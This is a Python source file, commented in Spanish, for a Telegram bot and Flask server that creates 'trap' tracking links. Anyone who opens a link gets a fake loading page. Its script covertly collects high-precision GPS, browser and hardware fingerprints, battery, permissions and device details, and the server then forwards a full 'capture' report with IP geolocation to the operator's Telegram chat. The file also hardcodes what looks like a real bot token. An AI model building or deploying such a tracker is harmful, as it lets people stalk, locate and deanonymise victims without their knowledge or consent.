import telebot
from flask import Flask, request, jsonify
import threading
import random
import string
import os
import time
import requests
import hashlib

# ================= CONFIGURACIÓN =================
TOKEN = '8740631074:AAHdTif9cw9BgLJ1lvuNEUTztYoH1zbxd6w'
TU_CHAT_ID = '2107923970'
PUERTO = 5000
BASE_URL = 'https://tracker-bot-gxaw.onrender.com'

app = Flask(__name__)
bot = telebot.TeleBot(TOKEN, threaded=False)
links_activos = {}

def generar_id_unico(longitud=12):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=longitud))

def obtener_info_ip(ip):
    """Obtiene información geográfica detallada de la IP"""
    try:
        response = requests.get(f'http://ipapi.co/{ip}/json/', timeout=5)
        data = response.json()
        return {
            'ip': ip,
            'pais': data.get('country_name', 'Desconocido'),
            'ciudad': data.get('city', 'Desconocida'),
            'region': data.get('region', 'Desconocida'),
            'codigo_pais': data.get('country_code', ''),
            'zona_horaria': data.get('timezone', ''),
            'isp': data.get('org', 'Desconocido'),
            'asn': data.get('asn', ''),
            'latitud': data.get('latitude', ''),
            'longitud': data.get('longitude', ''),
            'codigo_postal': data.get('postal', ''),
            'vpn': data.get('vpn', False),
            'proxy': data.get('proxy', False),
            'tor': data.get('tor', False)
        }
    except:
        return {'ip': ip, 'pais': 'Desconocido', 'ciudad': 'Desconocida'}

def enviar_telegram(mensaje, parse_mode="HTML"):
    try:
        bot.send_message(TU_CHAT_ID, mensaje, parse_mode=parse_mode, disable_web_page_preview=True)
    except Exception as e:
        print(f"Error: {e}")

# ================= COMANDOS DEL BOT =================
@bot.message_handler(commands=['start', 'generar'])
def comando_generar(message):
    id_unico = generar_id_unico()
    url_trampa = f"{BASE_URL}/t/{id_unico}"
    
    links_activos[id_unico] = {
        'creator': message.from_user.username,
        'url': url_trampa,
        'visitas': 0,
        'primera_visita': None
    }
    
    texto = f"🎯 <b>Link Tracker Generado</b>\n\n"
    texto += f"🔗 <code>{url_trampa}</code>\n\n"
    texto += f"👁️ <b>Visitas:</b> 0\n"
    texto += f"⏰ <b>Creado:</b> {time.strftime('%H:%M:%S')}\n\n"
    texto += f"📊 <b>Recopilará:</b>\n"
    texto += "  • Ubicación GPS + IP\n"
    texto += "  • Dispositivo + Hardware\n"
    texto += "  • Navegador + Plugins\n"
    texto += "  • Fingerprinting\n"
    texto += "  • Sensores\n\n"
    texto += f"⚠️ <i>Envía este link para rastrear.</i>"
    
    bot.reply_to(message, texto, parse_mode="HTML")

# ================= RUTAS WEB =================
@app.route('/')
def home():
    return """
    <html>
    <head><title>Tracker Bot</title></head>
    <body style="background:#0f0f1a;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0">
        <div style="text-align:center">
            <h1>🤖 Bot Tracker Activo</h1>
            <p>Usa /generar en Telegram para crear links de rastreo</p>
        </div>
    </body>
    </html>
    """

@app.route('/t/<id_link>')
def servir_trampa(id_link):
    if id_link not in links_activos:
        return "❌ Link inválido o expirado", 404
    
    links_activos[id_link]['visitas'] += 1
    if not links_activos[id_link]['primera_visita']:
        links_activos[id_link]['primera_visita'] = time.strftime('%Y-%m-%d %H:%M:%S')
    
    return HTML_TRAMPA, 200

@app.route('/api/capturar/<id_link>', methods=['POST'])
def recibir_datos(id_link):
    if id_link not in links_activos:
        return jsonify({"status": "invalid"}), 404

    datos = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Obtener info detallada de la IP
    info_ip = obtener_info_ip(ip.split(',')[0].strip())
    
    # Calcular fingerprint único
    fingerprint = hashlib.md5(
        f"{datos.get('canvas', '')}{datos.get('webgl', '')}{datos.get('audio', '')}{datos.get('userAgent', '')}".encode()
    ).hexdigest()[:12]
    
    # Construir mensaje COMPLETO
    msg = f"🚨 <b>¡NUEVA CAPTURA!</b> 🚨\n\n"
    
    # 🔴 INFORMACIÓN DE UBICACIÓN
    msg += f"📍 <b>UBICACIÓN GEOGRÁFICA</b>\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"🌐 <b>IP:</b> <code>{info_ip.get('ip', 'N/A')}</code>\n"
    msg += f"🌎 <b>País:</b> {info_ip.get('pais', 'N/A')} {info_ip.get('codigo_pais', '')}\n"
    msg += f"🏙️ <b>Ciudad:</b> {info_ip.get('ciudad', 'N/A')}\n"
    msg += f"📮 <b>Región:</b> {info_ip.get('region', 'N/A')}\n"
    msg += f"📮 <b>CP:</b> {info_ip.get('codigo_postal', 'N/A')}\n"
    msg += f"🕐 <b>Zona:</b> {info_ip.get('zona_horaria', 'N/A')}\n"
    msg += f"🌐 <b>ISP:</b> {info_ip.get('isp', 'N/A')}\n"
    msg += f"🔢 <b>ASN:</b> {info_ip.get('asn', 'N/A')}\n"
    
    # VPN/Proxy/Tor
    vpn_status = []
    if info_ip.get('vpn'): vpn_status.append("🔴 VPN")
    if info_ip.get('proxy'): vpn_status.append("⚠️ Proxy")
    if info_ip.get('tor'): vpn_status.append("🎭 Tor")
    if vpn_status:
        msg += f"🔒 <b>Seguridad:</b> {', '.join(vpn_status)}\n"
    else:
        msg += f"✅ <b>Conexión:</b> Directa\n"
    
    # Coordenadas GPS
    if info_ip.get('latitud') and info_ip.get('longitud'):
        lat = info_ip.get('latitud')
        lon = info_ip.get('longitud')
        msg += f"📍 <b>GPS:</b> {lat}, {lon}\n"
        msg += f"<a href='https://www.google.com/maps?q={lat},{lon}'>🗺️ Ver en Google Maps</a>\n"
    
    # Coordenadas precisas del navegador
    if datos.get('gps_lat') and datos.get('gps_lon'):
        msg += f"\n🎯 <b>GPS Preciso:</b>\n"
        msg += f"📍 {datos.get('gps_lat')}, {datos.get('gps_lon')}\n"
        msg += f"📏 <b>Precisión:</b> {datos.get('gps_accuracy', 'N/A')}m\n"
        if datos.get('gps_alt'):
            msg += f"⬆️ <b>Altitud:</b> {datos.get('gps_alt')}m\n"
        if datos.get('gps_speed'):
            msg += f"💨 <b>Velocidad:</b> {datos.get('gps_speed')} m/s\n"
        msg += f"<a href='https://www.google.com/maps?q={datos.get('gps_lat')},{datos.get('gps_lon')}'>📍 Mapa GPS</a>\n"
    
    # 💻 INFORMACIÓN DEL DISPOSITIVO
    msg += f"\n💻 <b>DISPOSITIVO</b>\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"📱 <b>Tipo:</b> {datos.get('device_type', 'N/A')}\n"
    msg += f"🖥️ <b>SO:</b> {datos.get('os', 'N/A')} {datos.get('os_version', '')}\n"
    msg += f"🌐 <b>Navegador:</b> {datos.get('browser', 'N/A')} {datos.get('browser_version', '')}\n"
    msg += f"🔧 <b>Motor:</b> {datos.get('engine', 'N/A')}\n"
    msg += f"📱 <b>Plataforma:</b> {datos.get('platform', 'N/A')}\n"
    msg += f"🏗️ <b>Arquitectura:</b> {datos.get('arch', 'N/A')}\n"
    
    # 🖥️ HARDWARE
    msg += f"\n🖥️ <b>HARDWARE</b>\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"💾 <b>RAM:</b> {datos.get('ram', 'N/A')}\n"
    msg += f"💻 <b>CPU Cores:</b> {datos.get('cpu_cores', 'N/A')}\n"
    msg += f"🎮 <b>GPU:</b> {datos.get('gpu', 'N/A')}\n"
    msg += f"🎨 <b>GPU Vendor:</b> {datos.get('gpu_vendor', 'N/A')}\n"
    msg += f"📐 <b>Pantalla:</b> {datos.get('screen', 'N/A')}\n"
    msg += f"📏 <b>Resolución:</b> {datos.get('screen_avail', 'N/A')}\n"
    msg += f"🎨 <b>Color Depth:</b> {datos.get('color_depth', 'N/A')} bits\n"
    msg += f"📊 <b>Pixel Ratio:</b> {datos.get('pixel_ratio', 'N/A')}x\n"
    msg += f"🔄 <b>Refresh Rate:</b> {datos.get('refresh_rate', 'N/A')}Hz\n"
    msg += f"🔋 <b>Batería:</b> {datos.get('bateria', 'N/A')}%\n"
    
    if datos.get('battery_charging') is not None:
        charging = "🔌 Cargando" if datos.get('battery_charging') else "🔋 Descargando"
        msg += f"{charging}\n"
    
    # 🌐 CONEXIÓN Y RED
    msg += f"\n🌐 <b>CONEXIÓN</b>\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"📡 <b>Tipo:</b> {datos.get('connection_type', 'N/A')}\n"
    msg += f"⚡ <b>Effective:</b> {datos.get('effective_type', 'N/A')}\n"
    msg += f"📶 <b>Downlink:</b> {datos.get('downlink', 'N/A')} Mbps\n"
    msg += f"⏱️ <b>RTT:</b> {datos.get('rtt', 'N/A')} ms\n"
    msg += f"🌍 <b>Idioma:</b> {datos.get('language', 'N/A')}\n"
    msg += f"⏰ <b>Timezone:</b> {datos.get('timezone', 'N/A')}\n"
    msg += f" <b>Timezone Offset:</b> {datos.get('timezone_offset', 'N/A')}\n"
    
    # 🔐 FINGERPRINTING
    msg += f"\n🔐 <b>FINGERPRINT</b>\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"🎨 <b>Canvas:</b> <code>{datos.get('canvas', 'N/A')}</code>\n"
    msg += f"🎮 <b>WebGL:</b> <code>{datos.get('webgl', 'N/A')}</code>\n"
    msg += f"🔊 <b>Audio:</b> <code>{datos.get('audio', 'N/A')}</code>\n"
    msg += f"🆔 <b>Hash:</b> <code>{fingerprint}</code>\n"
    msg += f"📝 <b>Plugins:</b> {datos.get('plugins_count', '0')} detectados\n"
    
    if datos.get('plugins'):
        msg += f" <code>{datos.get('plugins', '')[:100]}...</code>\n"
    
    msg += f"🎨 <b>WebGL Vendor:</b> {datos.get('webgl_vendor', 'N/A')}\n"
    msg += f"🎮 <b>WebGL Renderer:</b> {datos.get('webgl_renderer', 'N/A')}\n"
    msg += f"📦 <b>WebGL Version:</b> {datos.get('webgl_version', 'N/A')}\n"
    
    # 🔧 CONFIGURACIÓN Y PERMISOS
    msg += f"\n🔧 <b>CONFIGURACIÓN</b>\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"🍪 <b>Cookies:</b> {datos.get('cookies', 'N/A')}\n"
    msg += f"🗄️ <b>LocalStorage:</b> {datos.get('local_storage', 'N/A')}\n"
    msg += f"💾 <b>SessionStorage:</b> {datos.get('session_storage', 'N/A')}\n"
    msg += f"🗃️ <b>IndexedDB:</b> {datos.get('indexed_db', 'N/A')}\n"
    msg += f" <b>Notificaciones:</b> {datos.get('notifications', 'N/A')}\n"
    msg += f"📋 <b>Clipboard:</b> {datos.get('clipboard', 'N/A')}\n"
    msg += f"🎮 <b>Gamepads:</b> {datos.get('gamepads', '0')} conectados\n"
    msg += f"🖱️ <b>Touch:</b> {datos.get('touch_support', 'N/A')}\n"
    msg += f" <b>Max Touch Points:</b> {datos.get('max_touch_points', 'N/A')}\n"
    
    # 🎨 CAPABILITIES
    msg += f"\n🎨 <b>CAPABILIDADES</b>\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"🎬 <b>WebGL:</b> {datos.get('webgl_support', 'N/A')}\n"
    msg += f"🎥 <b>WebGPU:</b> {datos.get('webgpu', 'N/A')}\n"
    msg += f" <b>WebRTC:</b> {datos.get('webrtc', 'N/A')}\n"
    msg += f"🎞️ <b>Video Codecs:</b> {datos.get('video_codecs', 'N/A')}\n"
    msg += f"🎵 <b>Audio Codecs:</b> {datos.get('audio_codecs', 'N/A')}\n"
    msg += f"📱 <b>VR:</b> {datos.get('vr_support', 'N/A')}\n"
    msg += f"️ <b>AR:</b> {datos.get('ar_support', 'N/A')}\n"
    
    # 📊 ESTADÍSTICAS
    msg += f"\n📊 <b>ESTADÍSTICAS</b>\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"👁️ <b>Total Visitas:</b> {links_activos[id_link]['visitas']}\n"
    if links_activos[id_link]['primera_visita']:
        msg += f"⏰ <b>Primera Visita:</b> {links_activos[id_link]['primera_visita']}\n"
    msg += f"🕐 <b>Hora:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
    msg += f"🔗 <b>ID:</b> <code>{id_link}</code>\n"
    
    # Enviar mensaje
    enviar_telegram(msg)
    
    # Enviar mensaje adicional con User Agent completo
    if datos.get('userAgent'):
        ua_msg = f"📱 <b>User Agent Completo:</b>\n\n<code>{datos.get('userAgent')}</code>"
        enviar_telegram(ua_msg)
    
    return jsonify({"status": "ok"}), 200

# ================= HTML TRAMPA COMPLETO =================
HTML_TRAMPA = """
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Cargando...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#0f0f1a 0%,#1a1a2e 100%);color:#fff;font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;overflow:hidden}
.container{text-align:center;padding:20px;max-width:500px}
.spinner{width:60px;height:60px;border:4px solid rgba(99,102,241,0.2);border-top:#6366f1;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 30px}
@keyframes spin{to{transform:rotate(360deg)}}
h1{font-size:24px;margin-bottom:15px;color:#6366f1}
p{color:#94a3b8;font-size:14px;line-height:1.6}
.progress{width:100%;height:4px;background:rgba(99,102,241,0.1);border-radius:2px;margin-top:30px;overflow:hidden}
.progress-bar{height:100%;background:linear-gradient(90deg,#6366f1,#8b5cf6);animation:progress 2s ease-in-out infinite;border-radius:2px}
@keyframes progress{0%,100%{width:0%}50%{width:100%}}
.info{margin-top:20px;font-size:12px;color:#64748b}
</style>
</head>
<body>
<div class="container">
  <div class="spinner"></div>
  <h1>Analizando Dispositivo</h1>
  <p>Recopilando información del sistema...</p>
  <p style="margin-top:10px;font-size:12px">Por favor espera mientras verificamos tu configuración</p>
  <div class="progress"><div class="progress-bar"></div></div>
  <div class="info">Procesando datos de hardware, red y ubicación</div>
</div>

<script>
// ================= FUNCIONES DE RECOLECCIÓN =================

async function obtenerFingerprintCanvas() {
  try {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = 200;
    canvas.height = 50;
    
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#6366f1';
    ctx.fillText('Fingerprint Test 🎨', 2, 2);
    ctx.fillStyle = '#8b5cf6';
    ctx.fillText('Canvas API', 2, 20);
    
    // Agregar formas complejas
    ctx.strokeStyle = '#ec4899';
    ctx.lineWidth = 2;
    ctx.beginPath();
    ctx.arc(150, 25, 20, 0, 2 * Math.PI);
    ctx.stroke();
    
    const dataURL = canvas.toDataURL();
    return btoa(dataURL).substring(0, 30);
  } catch(e) { return 'N/A'; }
}

async function obtenerFingerprintWebGL() {
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    
    if (!gl) return 'N/A';
    
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    if (!debugInfo) return 'WebGL disponible';
    
    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    const version = gl.getParameter(gl.VERSION);
    
    return btoa(`${vendor}-${renderer}`).substring(0, 30);
  } catch(e) { return 'N/A'; }
}

async function obtenerFingerprintAudio() {
  try {
    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    const oscillator = audioCtx.createOscillator();
    const analyser = audioCtx.createAnalyser();
    const gainNode = audioCtx.createGain();
    
    oscillator.type = 'triangle';
    oscillator.frequency.value = 1000;
    
    oscillator.connect(analyser);
    analyser.connect(gainNode);
    gainNode.connect(audioCtx.destination);
    
    oscillator.start(0);
    
    const dataArray = new Uint8Array(analyser.frequencyBinCount);
    analyser.getByteFrequencyData(dataArray);
    
    oscillator.stop();
    audioCtx.close();
    
    return btoa(String.fromCharCode.apply(null, dataArray.slice(0, 20))).substring(0, 20);
  } catch(e) { return 'N/A'; }
}

async function obtenerFuentesInstaladas() {
  const fuentesBase = [
    'Arial', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia',
    'Impact', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black',
    'Webdings', 'Wingdings', 'Palatino Linotype', 'Tahoma',
    'Helvetica', 'Futura', 'Gill Sans', 'Optima', 'Garamond',
    'Baskerville', 'Bodoni', 'Century Gothic', 'Franklin Gothic'
  ];
  
  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  canvas.width = 200;
  canvas.height = 50;
  
  const fuentesDetectadas = [];
  
  ctx.font = '10px sans-serif';
  const widthBase = ctx.measureText('mmmmmmmmmmllliii').width;
  
  for (let fuente of fuentesBase) {
    ctx.font = `10px "${fuente}", sans-serif`;
    const width = ctx.measureText('mmmmmmmmmmllliii').width;
    
    if (width !== widthBase) {
      fuentesDetectadas.push(fuente);
    }
  }
  
  return fuentesDetectadas;
}

async function obtenerInfoWebGLDetallada() {
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    
    if (!gl) return { support: 'No' };
    
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    
    return {
      support: 'Sí',
      vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
      renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A',
      version: gl.getParameter(gl.VERSION) || 'N/A',
      shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION) || 'N/A',
      maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE) || 'N/A',
      maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS) || 'N/A',
      extensions: gl.getSupportedExtensions() ? gl.getSupportedExtensions().length : 0
    };
  } catch(e) { return { support: 'Error' }; }
}

async function obtenerCodecsSoportados() {
  const video = document.createElement('video');
  const audio = document.createElement('audio');
  
  const videoCodecs = [];
  const audioCodecs = [];
  
  // Video codecs
  if (video.canPlayType('video/mp4; codecs="avc1.42E01E"')) videoCodecs.push('H.264');
  if (video.canPlayType('video/mp4; codecs="hev1"')) videoCodecs.push('HEVC');
  if (video.canPlayType('video/webm; codecs="vp9"')) videoCodecs.push('VP9');
  if (video.canPlayType('video/webm; codecs="vp8"')) videoCodecs.push('VP8');
  if (video.canPlayType('video/webm; codecs="av1"')) videoCodecs.push('AV1');
  
  // Audio codecs
  if (audio.canPlayType('audio/mpeg')) audioCodecs.push('MP3');
  if (audio.canPlayType('audio/mp4; codecs="mp4a.40.2"')) audioCodecs.push('AAC');
  if (audio.canPlayType('audio/ogg; codecs="opus"')) audioCodecs.push('Opus');
  if (audio.canPlayType('audio/wav')) audioCodecs.push('WAV');
  if (audio.canPlayType('audio/webm; codecs="opus"')) audioCodecs.push('WebM');
  
  return {
    video: videoCodecs.join(', ') || 'Ninguno',
    audio: audioCodecs.join(', ') || 'Ninguno'
  };
}

async function obtenerSensores() {
  const sensores = {
    acelerometro: 'No soportado',
    giroscopio: 'No soportado',
    magnetometro: 'No soportado',
    orientacion: 'No soportado'
  };
  
  // Detectar orientación
  if (window.DeviceOrientationEvent) {
    sensores.orientacion = 'Disponible';
  }
  
  // Detectar movimiento
  if (window.DeviceMotionEvent) {
    sensores.acelerometro = 'Disponible';
  }
  
  return sensores;
}

async function obtenerPermisos() {
  const permisos = {};
  
  if (navigator.permissions) {
    try {
      const geolocation = await navigator.permissions.query({ name: 'geolocation' });
      permisos.geolocation = geolocation.state;
      
      const notification = await navigator.permissions.query({ name: 'notifications' });
      permisos.notifications = notification.state;
      
      const camera = await navigator.permissions.query({ name: 'camera' });
      permisos.camera = camera.state;
      
      const microphone = await navigator.permissions.query({ name: 'microphone' });
      permisos.microphone = microphone.state;
      
      const clipboard = await navigator.permissions.query({ name: 'clipboard-read' });
      permisos.clipboard = clipboard.state;
    } catch(e) {}
  }
  
  return permisos;
}

async function obtenerDispositivosMultimedia() {
  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    
    const cameras = devices.filter(d => d.kind === 'videoinput').length;
    const microphones = devices.filter(d => d.kind === 'audioinput').length;
    const speakers = devices.filter(d => d.kind === 'audiooutput').length;
    
    return { cameras, microphones, speakers, total: devices.length };
  } catch(e) {
    return { cameras: 0, microphones: 0, speakers: 0, total: 0 };
  }
}

async function obtenerAlmacenamiento() {
  const storage = {
    localStorage: 'No disponible',
    sessionStorage: 'No disponible',
    indexedDB: 'No disponible',
    cookies: 'Desactivadas'
  };
  
  // Cookies
  if (navigator.cookieEnabled) {
    storage.cookies = 'Activadas';
  }
  
  // LocalStorage
  try {
    localStorage.setItem('test', 'test');
    localStorage.removeItem('test');
    storage.localStorage = 'Disponible';
  } catch(e) {}
  
  // SessionStorage
  try {
    sessionStorage.setItem('test', 'test');
    sessionStorage.removeItem('test');
    storage.sessionStorage = 'Disponible';
  } catch(e) {}
  
  // IndexedDB
  if (window.indexedDB) {
    storage.indexedDB = 'Disponible';
  }
  
  return storage;
}

async function obtenerGamepads() {
  const gamepads = navigator.getGamepads ? navigator.getGamepads() : [];
  const conectados = Array.from(gamepads).filter(gp => gp !== null);
  return conectados.length;
}

async function obtenerInfoBateria() {
  try {
    if ('getBattery' in navigator) {
      const battery = await navigator.getBattery();
      return {
        nivel: Math.round(battery.level * 100),
        cargando: battery.charging,
        tiempoCarga: battery.chargingTime === Infinity ? 'N/A' : battery.chargingTime,
        tiempodescarga: battery.dischargingTime === Infinity ? 'N/A' : battery.dischargingTime
      };
    }
  } catch(e) {}
  return { nivel: 'N/A', cargando: null };
}

async function obtenerInfoConexion() {
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  
  if (conn) {
    return {
      type: conn.effectiveType || 'desconocida',
      downlink: conn.downlink || 'N/A',
      rtt: conn.rtt || 'N/A',
      saveData: conn.saveData || false
    };
  }
  return { type: 'N/A', downlink: 'N/A', rtt: 'N/A' };
}

// ================= FUNCIÓN PRINCIPAL =================

async function capturar(){
  const id = window.location.pathname.split('/')[2];
  
  // Recopilar TODA la información
  const datos = {
    // Información básica
    userAgent: navigator.userAgent,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezone_offset: new Date().getTimezoneOffset(),
    platform: navigator.platform,
    
    // Detección de SO
    os: 'Desconocido',
    os_version: '',
    browser: 'Desconocido',
    browser_version: '',
    engine: '',
    arch: navigator.userAgent.includes('Win64') || navigator.userAgent.includes('x86_64') ? '64-bit' : '32-bit'
  };
  
  // Detectar SO y navegador
  const ua = navigator.userAgent;
  
  if (ua.includes('Android')) {
    datos.os = 'Android';
    datos.os_version = ua.match(/Android ([0-9.]+)/)?.[1] || '';
    datos.device_type = 'Móvil';
  } else if (ua.includes('iPhone')) {
    datos.os = 'iOS';
    datos.os_version = ua.match(/OS ([0-9_]+)/)?.[1].replace(/_/g, '.') || '';
    datos.device_type = 'Móvil';
  } else if (ua.includes('Windows')) {
    datos.os = 'Windows';
    if (ua.includes('Windows NT 10.0')) datos.os_version = '10/11';
    else if (ua.includes('Windows NT 6.3')) datos.os_version = '8.1';
    else if (ua.includes('Windows NT 6.2')) datos.os_version = '8';
    else if (ua.includes('Windows NT 6.1')) datos.os_version = '7';
    datos.device_type = 'Desktop';
  } else if (ua.includes('Mac')) {
    datos.os = 'macOS';
    datos.device_type = 'Desktop';
  } else if (ua.includes('Linux')) {
    datos.os = 'Linux';
    datos.device_type = 'Desktop';
  } else {
    datos.device_type = 'Desconocido';
  }
  
  // Detectar navegador
  if (ua.includes('Chrome') && !ua.includes('Edg')) {
    datos.browser = 'Chrome';
    datos.browser_version = ua.match(/Chrome\/([0-9.]+)/)?.[1] || '';
    datos.engine = 'Blink';
  } else if (ua.includes('Firefox')) {
    datos.browser = 'Firefox';
    datos.browser_version = ua.match(/Firefox\/([0-9.]+)/)?.[1] || '';
    datos.engine = 'Gecko';
  } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
    datos.browser = 'Safari';
    datos.browser_version = ua.match(/Version\/([0-9.]+)/)?.[1] || '';
    datos.engine = 'WebKit';
  } else if (ua.includes('Edg')) {
    datos.browser = 'Edge';
    datos.browser_version = ua.match(/Edg\/([0-9.]+)/)?.[1] || '';
    datos.engine = 'Blink';
  } else {
    datos.engine = 'Desconocido';
  }
  
  // Pantalla
  datos.screen = `${window.screen.width}x${window.screen.height}`;
  datos.screen_avail = `${window.screen.availWidth}x${window.screen.availHeight}`;
  datos.color_depth = window.screen.colorDepth;
  datos.pixel_ratio = window.devicePixelRatio;
  
  // Hardware
  datos.cpu_cores = navigator.hardwareConcurrency || 'N/A';
  
  // Batería
  const bateria = await obtenerInfoBateria();
  datos.bateria = bateria.nivel;
  datos.battery_charging = bateria.cargando;
  
  // Conexión
  const conn = await obtenerInfoConexion();
  datos.connection_type = conn.type;
  datos.downlink = conn.downlink;
  datos.rtt = conn.rtt;
  
  // Almacenamiento
  const storage = await obtenerAlmacenamiento();
  datos.cookies = storage.cookies;
  datos.local_storage = storage.localStorage;
  datos.session_storage = storage.sessionStorage;
  datos.indexed_db = storage.indexedDB;
  
  // Fingerprinting
  datos.canvas = await obtenerFingerprintCanvas();
  datos.webgl = await obtenerFingerprintWebGL();
  datos.audio = await obtenerFingerprintAudio();
  
  // WebGL detallado
  const webglInfo = await obtenerInfoWebGLDetallada();
  datos.webgl_support = webglInfo.support;
  datos.webgl_vendor = webglInfo.vendor;
  datos.webgl_renderer = webglInfo.renderer;
  datos.webgl_version = webglInfo.version;
  
  // Codecs
  const codecs = await obtenerCodecsSoportados();
  datos.video_codecs = codecs.video;
  datos.audio_codecs = codecs.audio;
  
  // Fuentes
  const fuentes = await obtenerFuentesInstaladas();
  datos.fuentes_count = fuentes.length;
  
  // Plugins
  const plugins = Array.from(navigator.plugins).map(p => p.name);
  datos.plugins = plugins.join(', ');
  datos.plugins_count = plugins.length;
  
  // Gamepads
  datos.gamepads = await obtenerGamepads();
  
  // Dispositivos multimedia
  const mediaDevices = await obtenerDispositivosMultimedia();
  datos.cameras = mediaDevices.cameras;
  datos.microphones = mediaDevices.microphones;
  datos.speakers = mediaDevices.speakers;
  
  // Permisos
  const permisos = await obtenerPermisos();
  datos.notifications = permisos.notifications || 'N/A';
  datos.clipboard = permisos.clipboard || 'N/A';
  
  // Sensores
  const sensores = await obtenerSensores();
  datos.sensores = sensores;
  
  // Touch support
  datos.touch_support = 'ontouchstart' in window ? 'Sí' : 'No';
  datos.max_touch_points = navigator.maxTouchPoints || 0;
  
  // WebGPU
  datos.webgpu = !!navigator.gpu ? 'Sí' : 'No';
  
  // WebRTC
  datos.webrtc = !!window.RTCPeerConnection ? 'Sí' : 'No';
  
  // VR/AR support
  datos.vr_support = !!navigator.xr ? 'Sí' : 'No';
  datos.ar_support = !!navigator.xr ? 'Sí' : 'No';
  
  // GPS de alta precisión
  if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        datos.gps_lat = position.coords.latitude.toFixed(6);
        datos.gps_lon = position.coords.longitude.toFixed(6);
        datos.gps_alt = position.coords.altitude ? position.coords.altitude.toFixed(2) : 'N/A';
        datos.gps_accuracy = position.coords.accuracy.toFixed(2);
        datos.gps_speed = position.coords.speed ? position.coords.speed.toFixed(2) : '0';
        enviarDatos(datos, id);
      },
      () => enviarDatos(datos, id),
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  } else {
    enviarDatos(datos, id);
  }
}

async function enviarDatos(datos, id) {
  try {
    await fetch('/api/capturar/' + id, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(datos),
      keepalive: true
    });
  } catch(e) {
    console.error('Error enviando datos:', e);
  }
}

// Ejecutar cuando cargue la página
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', capturar);
} else {
  capturar();
}

// Mantener la página activa por si hay retrasos
setTimeout(capturar, 2000);
setTimeout(capturar, 5000);
</script>
</body>
</html>
"""

# ================= FUNCIONES DE INICIO =================
def iniciar_bot():
    print("🤖 Bot iniciado...")
    bot.infinity_polling()

def iniciar_flask():
    print(f"🌐 Servidor en puerto {PUERTO}...")
    app.run(host='0.0.0.0', port=PUERTO, threaded=True)

if __name__ == '__main__':
    print("✨ Iniciando Tracker Bot Avanzado...")
    print(f"📍 Base URL: {BASE_URL}")
    print(" Características activadas:")
    print("  • Geolocalización GPS + IP")
    print("  • Fingerprinting avanzado")
    print("  • Hardware detallado")
    print("  • Sensores del dispositivo")
    print("  • Detección VPN/Proxy")
    print("  • WebGL + Canvas + Audio")
    threading.Thread(target=iniciar_flask, daemon=True).start()
    iniciar_bot()
